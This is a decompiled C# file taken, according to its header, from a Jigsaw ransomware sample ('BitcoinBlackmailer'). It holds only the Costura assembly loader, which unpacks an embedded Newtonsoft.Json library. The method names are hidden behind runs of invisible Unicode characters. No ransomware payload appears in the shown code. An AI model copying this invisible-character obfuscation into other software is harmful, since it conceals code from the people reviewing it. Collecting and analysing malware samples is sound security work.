// Decompiled with JetBrains decompiler
// Type: Costura.AssemblyLoader
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-773295583998b76b4e24b562f85fa685577067614133db4a7df3d2a28cb4cc3a.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Costura
{
  [CompilerGenerated]
  internal static class AssemblyLoader
  {
    private static readonly Dictionary<string, bool> nullCache = new Dictionary<string, bool>();
    private static readonly Dictionary<string, string> assemblyNames = new Dictionary<string, string>();
    private static readonly Dictionary<string, string> symbolNames = new Dictionary<string, string>();
    private static ResolveEventHandler CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1;

    private static string CultureToString(CultureInfo culture) => culture == null ? "" : AssemblyLoader.\u202C‪⁯‭⁭‬⁫‮‭‏‏‏⁯⁮⁮⁮‍⁬⁬‫‌‫​⁭‍‫⁫‍⁯⁭‌‫⁮‌‎‎⁯‪‏‌‮(culture);

    private static Assembly ReadExistingAssembly(AssemblyName name)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      foreach (Assembly assembly in AssemblyLoader.\u206E‬​‎​‫‬⁬⁪⁪‏‎⁫‪⁭‏‮⁪‬‪⁭‬‌‬‏‭‎‍‭⁯‎⁮‪‎⁬‭⁬⁮‬⁪‮(AssemblyLoader.\u206B‫‏​‭​⁬⁫‏‎‭⁯‌⁯‍‪⁮‭‏⁪‬‍⁪​‍‌⁬⁮⁫‏‎‭‎⁪‬⁭‪⁪‮‎‮()))
      {
        // ISSUE: reference to a compiler-generated method
        AssemblyName assemblyName = AssemblyLoader.\u200B⁯⁭⁪‪‬⁫‎‬​⁫‎‏⁮⁮⁭‏‫⁯‍⁫‌⁪⁪‏‏‍⁮​⁪‪​⁭⁭‬⁯⁬⁭​⁭‮(assembly);
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        if (AssemblyLoader.\u200F‭⁯‪⁪​​⁬‍‭​‏​‍‪‫‎⁯‭⁭‪‫⁭‭‎‫‌‪‎‌‮‭‌‬⁫‬⁫⁯‎‌‮(AssemblyLoader.\u202D‎⁫⁪‪⁯‮⁯‎‭⁭​⁫⁫‬‌​‪‬‍‍⁪‍‬⁪‪‬⁮‪‪⁭‎⁪⁪⁭⁬‮​⁫‪‮(assemblyName), AssemblyLoader.\u202D‎⁫⁪‪⁯‮⁯‎‭⁭​⁫⁫‬‌​‪‬‍‍⁪‍‬⁪‪‬⁮‪‪⁭‎⁪⁪⁭⁬‮​⁫‪‮(name), StringComparison.InvariantCultureIgnoreCase) && AssemblyLoader.\u200F‭⁯‪⁪​​⁬‍‭​‏​‍‪‫‎⁯‭⁭‪‫⁭‭‎‫‌‪‎‌‮‭‌‬⁫‬⁫⁯‎‌‮(AssemblyLoader.CultureToString(AssemblyLoader.\u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮(assemblyName)), AssemblyLoader.CultureToString(AssemblyLoader.\u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮(name)), StringComparison.InvariantCultureIgnoreCase))
          return assembly;
      }
      return (Assembly) null;
    }

    private static void CopyTo(Stream source, Stream destination)
    {
      byte[] numArray = new byte[81920];
      int num;
      // ISSUE: reference to a compiler-generated method
      while ((num = AssemblyLoader.\u206B‮‫‪⁪‍⁭⁫‪‪​‌⁮‏‍‍‎‏⁬‪‬‌⁮‭⁮‪‏‮⁬‭‭⁮‍‪‫‫‪‌‫⁯‮(source, numArray, 0, numArray.Length)) != 0)
      {
        // ISSUE: reference to a compiler-generated method
        AssemblyLoader.\u206F‍‫‭⁭‪⁫‌‮‍‏‌‬‫‬‍‌‌‏‌⁯‬​‮‭‪⁮⁮‎⁯⁯⁬⁬‎⁬‍‭‭​⁯‮(destination, numArray, 0, num);
      }
    }

    private static Stream LoadStream(string fullname)
    {
      // ISSUE: reference to a compiler-generated method
      Assembly assembly = AssemblyLoader.\u200B‮​⁮‍‏⁯⁭‪⁯‭​‌‎⁮‫‌​‍‌‫‏‬‭‪‮​‍⁪‏⁫⁯‎⁫‎⁯⁪⁮‮‬‮();
      // ISSUE: reference to a compiler-generated method
      if (!AssemblyLoader.\u200E⁫⁬‍‎‌⁫‫⁯⁯‌⁮‍‭⁪‫‭‪‏⁬‮⁪​⁬‭‍⁪‭‬⁬‮⁭⁯‭‭‌⁬​⁯⁮‮(fullname, ".zip"))
      {
        // ISSUE: reference to a compiler-generated method
        return AssemblyLoader.\u202C‭⁭‌‍‬‭⁫⁬⁪‪‭​‏‍‌‮⁯‬‌‪​‎⁭​⁮‏‪⁭⁯‍‪⁮⁪⁭⁯‪‎‫‪‮(assembly, fullname);
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream = AssemblyLoader.\u202C‭⁭‌‍‬‭⁫⁬⁪‪‭​‏‍‌‮⁯‬‌‪​‎⁭​⁮‏‪⁭⁯‍‪⁮⁪⁭⁯‪‎‫‪‮(assembly, fullname);
      try
      {
        // ISSUE: reference to a compiler-generated method
        DeflateStream source = AssemblyLoader.\u202B⁫​⁪‪‬‌‍⁮‎⁬‍‮⁮‫‫‏⁬​⁮​⁮‫⁮‭‌‏⁪‪‭⁮⁯⁬‍‮‏⁯⁮⁯⁮‮(stream, CompressionMode.Decompress);
        try
        {
          // ISSUE: reference to a compiler-generated method
          MemoryStream destination = AssemblyLoader.\u206B​⁮⁮⁫‫‎‌‮⁫⁯‍⁬‪⁫‫‬‍⁪⁯‌⁮⁮‬⁯‫⁮‪⁬‫​‮⁯⁪⁮⁭‎‎⁪‮‮();
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.CopyTo((Stream) source, (Stream) destination);
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.\u206D⁪‪‫‭‎‮‏‌‌‫​‏‬⁫⁪‎‮‌‬⁫‎⁯⁬⁯‬‬⁬⁭⁬‌‌‬‬​‫‪‌‭‫‮((Stream) destination, 0L);
          return (Stream) destination;
        }
        finally
        {
          if (source != null)
          {
            // ISSUE: reference to a compiler-generated method
            AssemblyLoader.\u206D⁯‬⁮​‎⁯‏⁬‏⁯⁪⁫⁬‬‭‎⁪‌‌⁮‎‭‌‪‫⁭‎‪‎‬​⁭​‍⁪⁫‬⁭‬‮((IDisposable) source);
          }
        }
      }
      finally
      {
        if (stream != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.\u206D⁯‬⁮​‎⁯‏⁬‏⁯⁪⁫⁬‬‭‎⁪‌‌⁮‎‭‌‪‫⁭‎‪‎‬​⁭​‍⁪⁫‬⁭‬‮((IDisposable) stream);
        }
      }
    }

    private static Stream LoadStream(Dictionary<string, string> resourceNames, string name)
    {
      string fullname;
      // ISSUE: reference to a compiler-generated method
      return resourceNames.TryGetValue(name, out fullname) ? AssemblyLoader.LoadStream(fullname) : (Stream) null;
    }

    private static byte[] ReadStream(Stream stream)
    {
      // ISSUE: reference to a compiler-generated method
      byte[] numArray = new byte[AssemblyLoader.\u206A‍⁫‮‎‏‌‍‪‌‌⁪‍‬⁭⁭‏⁪‌‭⁯⁬⁬‮‎‫⁫‭‌‏⁯‬⁭‮⁫‪​‎‎‌‮(stream)];
      // ISSUE: reference to a compiler-generated method
      AssemblyLoader.\u206B‮‫‪⁪‍⁭⁫‪‪​‌⁮‏‍‍‎‏⁬‪‬‌⁮‭⁮‪‏‮⁬‭‭⁮‍‪‫‫‪‌‫⁯‮(stream, numArray, 0, numArray.Length);
      return numArray;
    }

    private static Assembly ReadFromEmbeddedResources(
      Dictionary<string, string> assemblyNames,
      Dictionary<string, string> symbolNames,
      AssemblyName requestedAssemblyName)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      string name = AssemblyLoader.\u200B‭‬‎‪⁪⁯‮⁬⁯⁯⁪‮‫‭‪​‏⁮‌⁯‮‌‏⁮‫​‬‏⁭‪‭‏‫⁯‍‭⁯‪⁪‮(AssemblyLoader.\u202D‎⁫⁪‪⁯‮⁯‎‭⁭​⁫⁫‬‌​‪‬‍‍⁪‍‬⁪‪‬⁮‪‪⁭‎⁪⁪⁭⁬‮​⁫‪‮(requestedAssemblyName));
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      if (AssemblyLoader.\u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮(requestedAssemblyName) != null && !AssemblyLoader.\u206A‌⁮‮‏⁬​‫‌​‍‬‪‌​⁮​⁯⁯‫‭⁪‏‫‪‪⁯⁪⁮‪⁫​‏​‬‮⁬‌‪‫‮(AssemblyLoader.\u202C‪⁯‭⁭‬⁫‮‭‏‏‏⁯⁮⁮⁮‍⁬⁬‫‌‫​⁭‍‫⁫‍⁯⁭‌‫⁮‌‎‎⁯‪‏‌‮(AssemblyLoader.\u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮(requestedAssemblyName))))
      {
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        name = AssemblyLoader.\u206C‭⁭⁯‬‎‎‎⁭‏⁭⁫‌‎‫‍‎⁫‪⁮‏‬⁯⁪‮⁫‫‪⁫⁫⁭‪⁪‫‏⁭⁯‎⁮⁯‮("{0}.{1}", (object) AssemblyLoader.\u202C‪⁯‭⁭‬⁫‮‭‏‏‏⁯⁮⁮⁮‍⁬⁬‫‌‫​⁭‍‫⁫‍⁯⁭‌‫⁮‌‎‎⁯‪‏‌‮(AssemblyLoader.\u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮(requestedAssemblyName)), (object) name);
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream1 = AssemblyLoader.LoadStream(assemblyNames, name);
      byte[] numArray1;
      try
      {
        if (stream1 == null)
          return (Assembly) null;
        // ISSUE: reference to a compiler-generated method
        numArray1 = AssemblyLoader.ReadStream(stream1);
      }
      finally
      {
        if (stream1 != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.\u206D⁯‬⁮​‎⁯‏⁬‏⁯⁪⁫⁬‬‭‎⁪‌‌⁮‎‭‌‪‫⁭‎‪‎‬​⁭​‍⁪⁫‬⁭‬‮((IDisposable) stream1);
        }
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream2 = AssemblyLoader.LoadStream(symbolNames, name);
      try
      {
        if (stream2 != null)
        {
          // ISSUE: reference to a compiler-generated method
          byte[] numArray2 = AssemblyLoader.ReadStream(stream2);
          // ISSUE: reference to a compiler-generated method
          return AssemblyLoader.\u202C⁭⁬‎⁯‍‌⁮⁬‍‬⁮‎‍‍‏⁮⁮⁪‎‫‭‏⁬‮‌‌​‬‫‮‏‍‌‎‌‌‎⁮‪‮(numArray1, numArray2);
        }
      }
      finally
      {
        if (stream2 != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.\u206D⁯‬⁮​‎⁯‏⁬‏⁯⁪⁫⁬‬‭‎⁪‌‌⁮‎‭‌‪‫⁭‎‪‎‬​⁭​‍⁪⁫‬⁭‬‮((IDisposable) stream2);
        }
      }
      // ISSUE: reference to a compiler-generated method
      return AssemblyLoader.\u206B⁬‏⁪‫⁬‍‌‭‎‭‭⁬‬​⁯‪‭‮‍⁬⁫‌​‫⁯‬‭‮⁮‎‪⁭‬⁬‭‬‬⁭⁬‮(numArray1);
    }

    public static Assembly ResolveAssembly(string assemblyName)
    {
      // ISSUE: reference to a compiler-generated field
      if (AssemblyLoader.nullCache.ContainsKey(assemblyName))
        return (Assembly) null;
      // ISSUE: reference to a compiler-generated method
      AssemblyName assemblyName1 = AssemblyLoader.\u206C⁯⁬​​‪⁭​⁫⁪‭‫‫‭‌‫‍‎⁭⁭‫​⁮‮‎‍‎​‌⁫‎⁭‏⁫‮⁬⁭⁪⁭‫‮(assemblyName);
      // ISSUE: reference to a compiler-generated method
      Assembly assembly1 = AssemblyLoader.ReadExistingAssembly(assemblyName1);
      if ((object) assembly1 != null)
        return assembly1;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      Assembly assembly2 = AssemblyLoader.ReadFromEmbeddedResources(AssemblyLoader.assemblyNames, AssemblyLoader.symbolNames, assemblyName1);
      if ((object) assembly2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        AssemblyLoader.nullCache.Add(assemblyName, true);
        // ISSUE: reference to a compiler-generated method
        if (AssemblyLoader.\u202A​‪‍⁮⁯‭‌‮⁮​‏‍‮‍⁮⁭‏‏‌‮‌⁭‌⁮⁭⁫⁬‍‏⁯⁮⁭‭‭‮⁫⁭‌‭‮(assemblyName1) == AssemblyNameFlags.Retargetable)
        {
          // ISSUE: reference to a compiler-generated method
          assembly2 = AssemblyLoader.\u202C‬‎‍‬‏⁪⁭‮​‎‬‪‏⁬‪‫‮⁮‬‏‎‮‍‭‮⁯‎⁮⁭‬‮⁮⁪‬‬⁯‎‏‍‮(assemblyName1);
        }
      }
      return assembly2;
    }

    static AssemblyLoader() => AssemblyLoader.assemblyNames.Add("newtonsoft.json", "costura.newtonsoft.json.dll.zip");

    private static Assembly \u003CAttach\u003Eb__0(object s, ResolveEventArgs e) => AssemblyLoader.ResolveAssembly(AssemblyLoader.\u206F⁭⁭‭‭‮⁪‮‬⁬​‪‪⁪⁭‭⁬⁬⁯‪‬‮‎‬‏⁯‮⁬‎​‫‭‭⁪‮⁮‭‮‎⁫‮(e));

    public static void Attach() => AssemblyLoader.\u200C⁬⁭‪‮‎⁬​​⁬⁯‪​⁮‏‏⁬⁫‮⁮‬⁫‌⁫‮‍‪‏‫‫‍‪‏⁬‭⁯⁯‏‌‮‮(AssemblyLoader.\u206B‫‏​‭​⁬⁫‏‎‭⁯‌⁯‍‪⁮‭‏⁪‬‍⁪​‍‌⁬⁮⁫‏‎‭‎⁪‬⁭‪⁪‮‎‮(), (ResolveEventHandler) ((s, e) => AssemblyLoader.ResolveAssembly(AssemblyLoader.\u206F⁭⁭‭‭‮⁪‮‬⁬​‪‪⁪⁭‭⁬⁬⁯‪‬‮‎‬‏⁯‮⁬‎​‫‭‭⁪‮⁮‭‮‎⁫‮(e))));

    static string \u202C‪⁯‭⁭‬⁫‮‭‏‏‏⁯⁮⁮⁮‍⁬⁬‫‌‫​⁭‍‫⁫‍⁯⁭‌‫⁮‌‎‎⁯‪‏‌‮([In] CultureInfo obj0) => obj0.Name;

    static AppDomain \u206B‫‏​‭​⁬⁫‏‎‭⁯‌⁯‍‪⁮‭‏⁪‬‍⁪​‍‌⁬⁮⁫‏‎‭‎⁪‬⁭‪⁪‮‎‮() => AppDomain.CurrentDomain;

    static Assembly[] \u206E‬​‎​‫‬⁬⁪⁪‏‎⁫‪⁭‏‮⁪‬‪⁭‬‌‬‏‭‎‍‭⁯‎⁮‪‎⁬‭⁬⁮‬⁪‮([In] AppDomain obj0) => obj0.GetAssemblies();

    static AssemblyName \u200B⁯⁭⁪‪‬⁫‎‬​⁫‎‏⁮⁮⁭‏‫⁯‍⁫‌⁪⁪‏‏‍⁮​⁪‪​⁭⁭‬⁯⁬⁭​⁭‮([In] Assembly obj0) => obj0.GetName();

    static string \u202D‎⁫⁪‪⁯‮⁯‎‭⁭​⁫⁫‬‌​‪‬‍‍⁪‍‬⁪‪‬⁮‪‪⁭‎⁪⁪⁭⁬‮​⁫‪‮([In] AssemblyName obj0) => obj0.Name;

    static bool \u200F‭⁯‪⁪​​⁬‍‭​‏​‍‪‫‎⁯‭⁭‪‫⁭‭‎‫‌‪‎‌‮‭‌‬⁫‬⁫⁯‎‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] StringComparison obj2)
    {
      return string.Equals(obj0, obj1, obj2);
    }

    static CultureInfo \u200D⁯‭‎‍‍⁯⁭‭​⁫⁮‫⁬‌⁫‭⁫‮⁯‍‪⁫‬‌⁭⁬⁭​⁫‭‭​‭⁫⁭⁮‭‏‫‮([In] AssemblyName obj0) => obj0.CultureInfo;

    static void \u206F‍‫‭⁭‪⁫‌‮‍‏‌‬‫‬‍‌‌‏‌⁯‬​‮‭‪⁮⁮‎⁯⁯⁬⁬‎⁬‍‭‭​⁯‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      obj0.Write(obj1, obj2, obj3);
    }

    static int \u206B‮‫‪⁪‍⁭⁫‪‪​‌⁮‏‍‍‎‏⁬‪‬‌⁮‭⁮‪‏‮⁬‭‭⁮‍‪‫‫‪‌‫⁯‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.Read(obj1, obj2, obj3);
    }

    static Assembly \u200B‮​⁮‍‏⁯⁭‪⁯‭​‌‎⁮‫‌​‍‌‫‏‬‭‪‮​‍⁪‏⁫⁯‎⁫‎⁯⁪⁮‮‬‮() => Assembly.GetExecutingAssembly();

    static bool \u200E⁫⁬‍‎‌⁫‫⁯⁯‌⁮‍‭⁪‫‭‪‏⁬‮⁪​⁬‭‍⁪‭‬⁬‮⁭⁯‭‭‌⁬​⁯⁮‮([In] string obj0, [In] string obj1) => obj0.EndsWith(obj1);

    static Stream \u202C‭⁭‌‍‬‭⁫⁬⁪‪‭​‏‍‌‮⁯‬‌‪​‎⁭​⁮‏‪⁭⁯‍‪⁮⁪⁭⁯‪‎‫‪‮([In] Assembly obj0, [In] string obj1) => obj0.GetManifestResourceStream(obj1);

    static DeflateStream \u202B⁫​⁪‪‬‌‍⁮‎⁬‍‮⁮‫‫‏⁬​⁮​⁮‫⁮‭‌‏⁪‪‭⁮⁯⁬‍‮‏⁯⁮⁯⁮‮(
      [In] Stream obj0,
      [In] CompressionMode obj1)
    {
      return new DeflateStream(obj0, obj1);
    }

    static MemoryStream \u206B​⁮⁮⁫‫‎‌‮⁫⁯‍⁬‪⁫‫‬‍⁪⁯‌⁮⁮‬⁯‫⁮‪⁬‫​‮⁯⁪⁮⁭‎‎⁪‮‮() => new MemoryStream();

    static void \u206D⁪‪‫‭‎‮‏‌‌‫​‏‬⁫⁪‎‮‌‬⁫‎⁯⁬⁯‬‬⁬⁭⁬‌‌‬‬​‫‪‌‭‫‮([In] Stream obj0, [In] long obj1) => obj0.Position = obj1;

    static void \u206D⁯‬⁮​‎⁯‏⁬‏⁯⁪⁫⁬‬‭‎⁪‌‌⁮‎‭‌‪‫⁭‎‪‎‬​⁭​‍⁪⁫‬⁭‬‮([In] IDisposable obj0) => obj0.Dispose();

    static long \u206A‍⁫‮‎‏‌‍‪‌‌⁪‍‬⁭⁭‏⁪‌‭⁯⁬⁬‮‎‫⁫‭‌‏⁯‬⁭‮⁫‪​‎‎‌‮([In] Stream obj0) => obj0.Length;

    static string \u200B‭‬‎‪⁪⁯‮⁬⁯⁯⁪‮‫‭‪​‏⁮‌⁯‮‌‏⁮‫​‬‏⁭‪‭‏‫⁯‍‭⁯‪⁪‮([In] string obj0) => obj0.ToLowerInvariant();

    static bool \u206A‌⁮‮‏⁬​‫‌​‍‬‪‌​⁮​⁯⁯‫‭⁪‏‫‪‪⁯⁪⁮‪⁫​‏​‬‮⁬‌‪‫‮([In] string obj0) => string.IsNullOrEmpty(obj0);

    static string \u206C‭⁭⁯‬‎‎‎⁭‏⁭⁫‌‎‫‍‎⁫‪⁮‏‬⁯⁪‮⁫‫‪⁫⁫⁭‪⁪‫‏⁭⁯‎⁮⁯‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2)
    {
      return string.Format(obj0, obj1, obj2);
    }

    static Assembly \u202C⁭⁬‎⁯‍‌⁮⁬‍‬⁮‎‍‍‏⁮⁮⁪‎‫‭‏⁬‮‌‌​‬‫‮‏‍‌‎‌‌‎⁮‪‮([In] byte[] obj0, [In] byte[] obj1) => Assembly.Load(obj0, obj1);

    static Assembly \u206B⁬‏⁪‫⁬‍‌‭‎‭‭⁬‬​⁯‪‭‮‍⁬⁫‌​‫⁯‬‭‮⁮‎‪⁭‬⁬‭‬‬⁭⁬‮([In] byte[] obj0) => Assembly.Load(obj0);

    static AssemblyName \u206C⁯⁬​​‪⁭​⁫⁪‭‫‫‭‌‫‍‎⁭⁭‫​⁮‮‎‍‎​‌⁫‎⁭‏⁫‮⁬⁭⁪⁭‫‮([In] string obj0) => new AssemblyName(obj0);

    static AssemblyNameFlags \u202A​‪‍⁮⁯‭‌‮⁮​‏‍‮‍⁮⁭‏‏‌‮‌⁭‌⁮⁭⁫⁬‍‏⁯⁮⁭‭‭‮⁫⁭‌‭‮(
      [In] AssemblyName obj0)
    {
      return obj0.Flags;
    }

    static Assembly \u202C‬‎‍‬‏⁪⁭‮​‎‬‪‏⁬‪‫‮⁮‬‏‎‮‍‭‮⁯‎⁮⁭‬‮⁮⁪‬‬⁯‎‏‍‮([In] AssemblyName obj0) => Assembly.Load(obj0);

    static string \u206F⁭⁭‭‭‮⁪‮‬⁬​‪‪⁪⁭‭⁬⁬⁯‪‬‮‎‬‏⁯‮⁬‎​‫‭‭⁪‮⁮‭‮‎⁫‮([In] ResolveEventArgs obj0) => obj0.Name;

    static void \u200C⁬⁭‪‮‎⁬​​⁬⁯‪​⁮‏‏⁬⁫‮⁮‬⁫‌⁫‮‍‪‏‫‫‍‪‏⁬‭⁯⁯‏‌‮‮(
      [In] AppDomain obj0,
      [In] ResolveEventHandler obj1)
    {
      obj0.AssemblyResolve += obj1;
    }
  }
}
